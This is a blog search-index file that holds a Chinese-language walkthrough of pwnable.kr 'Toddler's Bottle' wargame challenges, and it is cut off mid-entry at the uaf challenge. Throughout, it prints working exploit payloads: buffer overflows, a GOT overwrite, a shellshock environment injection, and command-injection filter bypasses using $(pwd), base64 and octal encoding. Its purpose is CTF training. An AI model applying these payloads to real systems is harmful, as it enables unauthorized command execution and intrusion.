<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2F2020%2F08%2F29%2Ftest%2F</url>
    <content type="text"><![CDATA[]]></content>
  </entry>
  <entry>
    <title><![CDATA[pwnable writeup]]></title>
    <url>%2F2019%2F08%2F08%2Fpwnable%2F</url>
    <content type="text"><![CDATA[Toddler's Bottle fd 题目描述 Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw ssh fd@pwnable.kr -p2222 (pw:guest) 题目解析 先了解下fd是什么东西 fd(file descriptor)，文件描述符 内核（kernel）利用文件描述符（file descriptor）来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。 习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。 ssh连接上题目，查看题目代码 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 令fd为0(stdin)，再输入LETMEWIN就可以得到flag。 payload 12./fd 4660input：LETMEWIN collision 题目描述 Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) 题目解析 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; check_password将char*强制转换为int*，也就是将输入的数据分为4个字节一组，5组数据相加最后的结果要等于0x21DD09EC 0x21DD09EC/5 = 0x6C5CEC9 * 4 + 0x6C5CEC8​ payload 1./col `python -c 'print "\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC8\xCE\xC5\x06"'` bof 题目描述 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 题目解析 很明显的栈溢出，将key的值覆盖为0xCAFEBABE就可以了 payload 12345678910from pwn import *context.log_level='debug'p=remote("pwnable.kr",9000)#print p.recvline()payload='a'*52payload+=p64(0xCAFEBABE)p.sendline(payload)p.interactive() flag 题目描述 虽然在pwnable上面，但是是一道逆向题 Papa brought me a packed present! let's open it. Download : http://pwnable.kr/bin/flag This is reversing task. all you need is binary 题目解析 刚拿到就直接放进了ida中，结果只显示4个函数，并且有的还无法F5。后来看了wp才知道程序被upx压缩过了 upx -d flag解压缩，ida分析程序 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *dest; // ST08_8 puts((__int64)"I will malloc() and strcpy the flag there. take it."); dest = (char *)malloc(100LL); strcpy(dest, flag); return 0;&#125; 非常简单的逻辑，把flag复制到dest中，查看flag处的数据即可 passcode 题目描述 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0;&#125; 题目解析 login函数中的两个scanf的参数没有加&amp;，但是scanf依然会把passcode1和passcode2当成指针来存储数据，也就是说此时输入的数据应该在passcode1和passcode2中的值所指向的地址里面。 如果将passcode1或passcode2里面的值覆盖为某个函数的地址，构造好栈的布局，参数为system("/bin/cat flag")的地址，那么scanf就会将system("/bin/cat flag")的地址覆盖到原本的函数地址上去，然后得到flag。 接下来就需要计算name到passcode的长度 gdb反汇编分析，只看关键部分 12345welcome: 0x0804862f &lt;+38&gt;: lea -0x70(%ebp),%edx ;name的地址 0x08048632 &lt;+41&gt;: mov %edx,0x4(%esp) 0x08048636 &lt;+45&gt;: mov %eax,(%esp) 0x08048639 &lt;+48&gt;: call 0x80484a0 &lt;__isoc99_scanf@plt&gt; 1234567891011121314login:passcode1: 0x0804857c &lt;+24&gt;: mov -0x10(%ebp),%edx ;passcode1的地址 0x0804857f &lt;+27&gt;: mov %edx,0x4(%esp) 0x08048583 &lt;+31&gt;: mov %eax,(%esp) 0x08048586 &lt;+34&gt;: call 0x80484a0 &lt;__isoc99_scanf@plt&gt;passcode2: 0x080485aa &lt;+70&gt;: mov -0xc(%ebp),%edx ;passcode2的地址 0x080485ad &lt;+73&gt;: mov %edx,0x4(%esp) 0x080485b1 &lt;+77&gt;: mov %eax,(%esp) 0x080485b4 &lt;+80&gt;: call 0x80484a0 &lt;__isoc99_scanf@plt&gt;system_getflag: 0x080485e3 &lt;+127&gt;: movl $0x80487af,(%esp) 0x080485ea &lt;+134&gt;: call 0x8048460 &lt;system@plt&gt; 通过计算可知，name到passcode1的长度为96字节，name的长度为100，刚好可以溢出覆盖passcode1。 接着查看plt表，因为只够覆盖到passcode1，所以选择fflush函数 payload 1python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode random 题目描述 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 题目解析 观察代码，令key^random的值等于0xdeadbeef就可以得到flag。刚开始以为是栈溢出，但是scanf("%d",&amp;key)只会读取4个字节，不够覆盖random。 调试了几次发现random每次的值都一样，那么只需要将0xdeadbeef与random异或就可以得到key的值，最后输入key的时候要先把key转为10进制，因为scanf的格式化字符串是%d。 关于为什么random每次的值都一样 rand函数不是真正的随机数生成器，而srand()会设置供rand()使用的随机数种子。如果你在第一次调用rand()之前没有调用srand()，那么系统会为你自动调用srand()。如果用户在此之前没有调用过srand(seed)，它会自动调用srand(1)一次。而使用同种子相同的数调用 rand()会导致相同的随机数序列被生成。 input2 题目描述 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf("Welcome to pwnable.kr\n"); printf("Let's see if you know how to give input to program\n"); printf("Just give me correct inputs then you will get the flag :)\n"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],"\x00")) return 0; if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0; printf("Stage 1 clear!\n"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0; read(2, buf, 4); if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0; printf("Stage 2 clear!\n"); // env if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0; printf("Stage 3 clear!\n"); // file FILE* fp = fopen("\x0a", "r"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0; fclose(fp); printf("Stage 4 clear!\n"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); // here's your flag system("/bin/cat flag"); return 0;&#125; 题目总共有五关，需要依次通过，pwntools完美解决。 题目解析 stage 1 argv 1234if(argc != 100) return 0;if(strcmp(argv['A'],"\x00")) return 0;if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;printf("Stage 1 clear!\n"); 第一关要求给出100个参数，并且第’A'（65）个和第'B'（66）个分别是\x00和\x20\x0a\x0d。 构造list，一般情况，argv[0]是"./input"，也就是程序名 1234argv = list('1' * 100)argv[0] = "./input"argv[ord('A')] = "\x00"argv[ord('B')] = "\x20\x0a\x0d" stage 2 stdio 123456char buf[4];read(0, buf, 4);if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;read(2, buf, 4);if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;printf("Stage 2 clear!\n"); 第一个memcmp从stdin中读取数据，与\x00\x0a\x00\xff进行对比，第二个memcmp从stderr中读取数据进行对比。 pwntools中的process有2个参数，stdin和stderr，传入文件对象即可。 123456with open("stdin.txt", "wb") as file: file.write("\x00\x0a\x00\xff") file.close()with open("stderr.txt", "wb") as file: file.write("\x00\x0a\x02\xff") file.close() stage 3 env 12if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;printf("Stage 3 clear!\n"); 依旧使用process中的env参数，env是字典形式。 1env = &#123;"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"&#125; stage 4 file 123456FILE* fp = fopen("\x0a", "r");if(!fp) return 0;if( fread(buf, 4, 1, fp)!=1 ) return 0;if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;fclose(fp);printf("Stage 4 clear!\n"); 这一关很简单，创建个名字为\x0a的文件，内容为\x00\x00\x00\x00 123with open("\x0a", "wb") as file: file.write("\x00\x00\x00\x00") file.close() stage 5 network 123456789101112131415161718192021222324int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); 这一关是建立一个socket来接受数据，与\xde\xad\xbe\xef进行比较。 其中需要注意这两句 12saddr.sin_addr.s_addr = INADDR_ANY;saddr.sin_port = htons( atoi(argv['C']) ); 第一句指定绑定的地址，INADDR_ANY事实上表示不确定地址，或“所有地址”、“任意地址”，127.0.0.1当然也包含在内，第二句指定绑定端口，端口号就是argv['C']的内容，因为argv是我们自己设置的，所以只要设置一个不与其他程序冲突的端口号就行。 直接使用pwntools的remote 12r = remote("127.0.0.1", 9999)r.send("\xde\xad\xbe\xef") payload 12345678910111213141516171819202122232425262728293031323334from pwn import *# stage 1 processargv = list('1' * 100)argv[0] = "./input"argv[ord('A')] = "\x00"argv[ord('B')] = "\x20\x0a\x0d"# stage 2 stdiowith open("stdin.txt", "wb") as file: file.write("\x00\x0a\x00\xff") file.close()with open("stderr.txt", "wb") as file: file.write("\x00\x0a\x02\xff") file.close()# stage 3 envenv = &#123;"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"&#125;# stage 4 filewith open("\x0a", "wb") as file: file.write("\x00\x00\x00\x00") file.close()# stage 5 networkargv[ord('C')] = "9999"p = process(argv=argv, env=env, stdin=open("stdin.txt","rb"), stderr=open("stderr.txt","rb"))r = remote("127.0.0.1", 9999)r.send("\xde\xad\xbe\xef")r.close()print p.recv()print p.recv() leg 题目描述 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123; asm("mov r3, pc\n");&#125;int key2()&#123; asm( "push &#123;r6&#125;\n" "add r6, pc, $1\n" "bx r6\n" ".code 16\n" "mov r3, pc\n" "add r3, $0x4\n" "push &#123;r3&#125;\n" "pop &#123;pc&#125;\n" ".code 32\n" "pop &#123;r6&#125;\n" );&#125;int key3()&#123; asm("mov r3, lr\n");&#125;int main()&#123; int key=0; printf("Daddy has very strong arm! : "); scanf("%d", &amp;key); if( (key1()+key2()+key3()) == key )&#123; printf("Congratz!\n"); int fd = open("flag", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); &#125; else&#123; printf("I have strong leg :P\n"); &#125; return 0;&#125; 题目解析 第27行中if( (key1()+key2()+key3()) == key )显示key的值为key1()+key2()+key3()的总和，相等即可得到flag。 源码中的看不懂，直接去看反汇编中的部分代码。 12345678910(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 首先了解下ARM函数调用约定，其中，结果为一个32位的整数时,可以通过寄存器R0返回，根据汇编代码可以看出，r3寄存器中的值传给了r0，而pc的值又传给了r3。 再来了解下pc寄存器，具体就不解释了不懂，大概就是 ARM模式下，pc=当前指令地址+8； Thumb模式下，pc=当前指令+4 而控制什么模式的就是一些带状态的指令，比如bx addr，bx就是带状态切换跳转指令，当addr的最后一位为1时，会将跳转地址处的代码解析为Thumb指令，最后一位为0的话，就解析成ARM指令。 所以key1=8cdc+8=8CE4‬ 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. 可以看到pc的值传给了r3，r3再与4相加，最后给r0，这样的话key2的值就应该为8D10‬，但是由于前面执行bx r6时r6最后一位为1，所以执行后面代码时的模式是Thumb模式，所以mov r3, pc时pc的值为8D08。 key2=8d04+4+4=8D0C‬ 12345678910(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump. lr-&gt;r3-&gt;r0，lr是寄存器R14: 连接寄存器,记作lr ; 它用于保存子程序的返回地址，返回地址就是调用函数下面那一句的地址 120x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;0x00008d80 &lt;+68&gt;: mov r3, r0 key3=8d80 key=key1+key2+key3=‭‭0x1A770‬=108400‬ mistake 题目描述 hint : operator priority 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 题目解析 题目提示操作符优先级 这题问题出在 1234if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; \(&lt;\)优先级要比\(=\)号高，所以会先判断open("/home/mistake/password",O_RDONLY,0400) &lt; 0，open函数读取成功文件描述符，必定大于0，所以open("/home/mistake/password",O_RDONLY,0400) &lt; 0整个式子的值就为false(0)，也就是fd=0。 那么下面的read(fd,pw_buf,PW_LEN)其实就是从标准输入里面读取数据。 当输入1234567890，与1进行异或运算后可以得到0325476981 shellshock 题目描述 Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :) ssh shellshock@pwnable.kr -p2222 (pw:guest) 1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 题目解析 setresgid 分别设置真实的,有效的和保存过的组标识号 setresuid 分别设置真实的,有效的和保存过的用户标识号 再看一下权限 123456shellshock@prowl:~$ ls -ltotal 960-r-xr-xr-x 1 root shellshock 959120 Oct 12 2014 bash-r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flag-r-xr-sr-x 1 root shellshock_pwn 8547 Oct 12 2014 shellshock-r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c shellshock文件所属组权限中有一个s，而s的含义代表SGID(Set Group ID, 4) SGID(Set Group ID, 4): 对于可执行文件，SGID与SUID类似，引发的进程的所有组是程序文件所属的组。对于目录，SGID属性会使目录中新建文件的所属组与该目录相同。SGID也可以用s表示，如: 12&gt; $ ls -l /vardrwxrwsr-x 2 root staff 4096 Apr 10 2014 localdrwxrwxr-x 15 root syslog 4096 Apr 4 19:57 log&gt; 也就是说shellshock运行时会得到shellshock_pwn的权限。 权限得到了，但是程序中并没有可以得到flag的地方，所以就要利用到shellshock漏洞，漏洞产生原因是由于bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令，例如： 1env x='() &#123; :;&#125;; echo vulnerable' bash -c "echo this is a test" 存在漏洞的bash版本会输出 12vulnerablethis is a test 在后面加bash -c的原因是打开一个bash使其立即触发漏洞，因为当前bash没有继承环境变量。 所以最终payload： 1env x='() &#123; :;&#125;; bash -c cat flag' ./shellshock 参考文章 https://www.freebuf.com/articles/system/45390.html http://aikin.me/2015/04/03/linux-file-permission-ower/ https://blog.csdn.net/starter_____/article/details/78164387 coin1 题目描述 1234567891011121314151617181920212223242526272829---------------------------------------------------- Shall we play a game? ----------------------------------------------------You have given some gold coins in your handhowever, there is one counterfeit coin among themcounterfeit coin looks exactly same as real coinhowever, its weight is different from real onereal coin weighs 10, counterfeit coin weighes 9help me to find the counterfeit coin with a scaleif you find 100 counterfeit coins, you will get reward :)FYI, you have 60 seconds.- How to play - 1. you get a number of coins (N) and number of chances (C)2. then you specify a set of index numbers of coins to be weighed3. you get the weight information4. 2~3 repeats C time, then you give the answer- Example -[Server] N=4 C=2 # find counterfeit among 4 coins with 2 trial[Client] 0 1 # weigh first and second coin[Server] 20 # scale result : 20[Client] 3 # weigh fourth coin[Server] 10 # scale result : 10[Client] 2 # counterfeit coin is third![Server] Correct!- Ready? starting in 3 sec... - 简单来说就是给一组硬币，其中有一个假硬币，真硬币重量10，假的重量9，在有限的次数中猜出来假的硬币是哪一个，可以通过输入0 1 2 3 4 .....来了解0 1 2 3 4 .....这一组硬币重量的综合。 题目解析 利用二分查找可以很快得到答案 1234567891011121314151617181920212223242526272829from pwn import *r = remote("pwnable.kr", 9007)for i in range(31): print r.recvline()for i in range(100): n_c = r.recvline() # print n_c N = int(n_c.split(" ")[0][2:]) C = int(n_c.split(" ")[1][2:]) print "[*]N=%d,C=%d" % (N, C) left, right = 0, N mid = int((left+right) / 2) for i in range(C): payload = ' '.join([str(i) for i in range(left, mid)]) r.sendline(payload) weight = int(r.recvline()) if weight % 10 == 0: left = mid right = right mid = int((right + left) / 2.0) else: left = left right = mid mid = int((left + right) / 2.0) r.sendline(str(left)) print r.recvline() 但是在本地执行脚本时由于网速问题，导致无法在60s内跑到第100次，所以要把脚本放到服务器上去执行。 连上之前任意一道题目的ssh，在tmp目录下写好脚本，r = remote("pwnable.kr", 9007)改为r = remote("0.0.0.0",9007)即可。 blackjack 题目描述 123456789Hey! check out this C implementation of blackjack game!I found it onlinehttp://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.htmlI like to give my flags to millionares.how much money you got?Running at : nc pwnable.kr 9009 blackjack，又名21点，详见游戏规则 大概就是赌谁的点大的游戏 题目解析 原本以为是个正经的pwn题，但是看到后面发现是道源码审计题。 主要问题出在betting函数中 1234567891011121314int betting() //Asks user amount to bet&#123; printf("\n\nEnter Bet: $"); scanf("%d", &amp;bet); if (bet &gt; cash) //If player tries to bet more money than player has &#123; printf("\nYou cannot bet more money than you have."); printf("\nEnter Bet: "); scanf("%d", &amp;bet); return bet; &#125; else return bet;&#125; // End Function 在判断bet &gt; cash之后，又进行了一次scanf，并且没有进行判断，直接返回。所以第一次输入一个大于500的值，第二次再输入一个大于1000000的数就可以得到flag。 lotto 题目描述 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf("Submit your 6 lotto bytes : "); fflush(stdout); int r; r = read(0, submit, 6); printf("Lotto Start!\n"); //sleep(1); // generate lotto numbers int fd = open("/dev/urandom", O_RDONLY); if(fd==-1)&#123; printf("error. tell admin\n"); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf("error2. tell admin\n"); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system("/bin/cat flag"); &#125; else&#123; printf("bad luck...\n"); &#125;&#125;void help()&#123; printf("- nLotto Rule -\n"); printf("nlotto is consisted with 6 random natural numbers less than 46\n"); printf("your goal is to match lotto numbers as many as you can\n"); printf("if you win lottery for *1st place*, you will get reward\n"); printf("for more details, follow the link below\n"); printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"); printf("mathematical chance to win this game is known to be 1/8145060.\n");&#125;int main(int argc, char* argv[])&#123; // menu unsigned int menu; while(1)&#123; printf("- Select Menu -\n"); printf("1. Play Lotto\n"); printf("2. Help\n"); printf("3. Exit\n"); scanf("%d", &amp;menu); switch(menu)&#123; case 1: play(); break; case 2: help(); break; case 3: printf("bye\n"); return 0; default: printf("invalid menu\n"); break; &#125; &#125; return 0;&#125; 题目解析 程序从/dev/urandom中读取6个字节随机数，与用户输入的数据进行对比，而问题就出在对比的地方 1234567for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125;&#125; 程序写成了嵌套循环，结果导致只要有一次lotto[i]==submit[j]，match++就可以加到6，最后得到flag。那么就随便挑个字符，然后爆破就行了。 1234567891011121314from pwn import *s=ssh("lotto","pwnable.kr",2222,"guest")p=s.process("/home/lotto/lotto")p.recv()while True: p.sendline("1") p.recv() payload="------" p.sendline(payload) recv_str=p.recv() if "bad luck...\n" not in recv_str: print recv_str break cmd1 题目描述 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, "flag")!=0; r += strstr(cmd, "sh")!=0; r += strstr(cmd, "tmp")!=0; return r;&#125;int main(int argc, char* argv[], char** envp)&#123; putenv("PATH=/thankyouverymuch"); if(filter(argv[1])) return 0; system( argv[1] ); return 0;&#125; 题目解析 程序执行用户输入的命令，但是设置了一个不存在的path环境变量/thankyouverymuch，并且对输入进行了过滤，不能输入sh，flag，tmp。 环境变量部分只需要带上路径访问就可以，过滤部分则需要利用linux的通配符，或者可以将"flag"拆分开 payload： ./cmd1 "/bin/cat fl*" 或者 ./cmd1 “/bin/cat \”f\”\”l\”\”a\”\”g\”” cmd2 题目描述 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, "=")!=0; r += strstr(cmd, "PATH")!=0; r += strstr(cmd, "export")!=0; r += strstr(cmd, "/")!=0; r += strstr(cmd, "`")!=0; r += strstr(cmd, "flag")!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv("PATH=/no_command_execution_until_you_become_a_hacker"); if(filter(argv[1])) return 0; printf("%s\n", argv[1]); system( argv[1] ); return 0;&#125; 题目解析 比起上一道题目难了许多，最麻烦的就是过滤了/，不能再/bin/cat fl*，当然还是有办法绕过。 pwd方式 虽然因为程序设置了PATH导致无法执行很多命令，但是发现可以执行pwd，有两种方法 进入到根目录/,此时pwd返回的结果就是/，利用$(pwd)就可以得到/接着构造payload： /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*' 首先在tmp目录下创建目录/tmp/test/c，这样在此目录下执行pwd会得到/tmp/test/c，接着在/tmp/test目录下建立cat的软连接：ln -s /bin/cat cat，在/tmp/test/c下建立flag的软连接：ln -s /home/cmd2/flag flag，然后在/tmp/test/c目录下执行命令：/home/cmd2/cmd2 "$(pwd)at f*" 编码方式 BASE64 首先将/bin/cat /home/cmd2/flag进行base64编码，得到L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnCg==，但是因为有=，所以需要在原来的字符串中插入两个空格，就不会有=了。 echo "\57"可以输出/，利用管道符进行解码，最后就可以得到flag ./cmd2 '$(echo "L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnICAK" | $(echo "\57")usr$(echo "\57")bin$(echo "\57")base64 -d)' 8进制 算出/bin/cat flag8进制代码，得到\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147，接着执行./cmd2 '$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")' 脑洞大开方式 利用read写入环境变量并执行 执行./cmd2 "read a;\$a"，输入/bin/cat flag得到flag read a;写入一个a变量，\$a转义$字符，执行$a变量。 shell内置函数command的参数-p 1./cmd2 "command -p cat \"f\"l\"a\"g" uaf 题目描述 Mommy, what is Use After Free bug? 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt; #include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system("/bin/sh"); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age 